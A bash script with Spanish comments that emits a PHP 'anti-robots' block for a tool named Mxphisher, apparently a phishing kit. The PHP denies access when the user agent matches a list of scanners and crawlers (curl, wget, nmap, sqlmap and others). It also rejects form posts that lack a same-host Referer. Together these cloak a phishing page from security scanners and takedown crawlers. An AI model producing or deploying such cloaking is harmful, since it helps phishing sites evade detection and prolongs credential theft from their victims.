#!/bin/bash

# Esta función se integra en el PHP, pero aquí va la lógica
generar_anti_robots_php() {
    cat << 'EOF'
<?php
// Anti-robots para Mxphisher
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('curl', 'python', 'wget', 'bot', 'spider', 'crawler', 'scanner', 'nmap', 'sqlmap');

foreach($bots as $bot) {
    if(stripos($user_agent, $bot) !== false) {
        http_response_code(403);
        die("🚫 Acceso denegado: Robots no bienvenidos");
    }
}

// Protección extra: verificar método POST
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verificar que no venga de un script
    if(!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST']) === false) {
        http_response_code(403);
        die("🚫 Solicitud sospechosa");
    }
}
?>
EOF
}
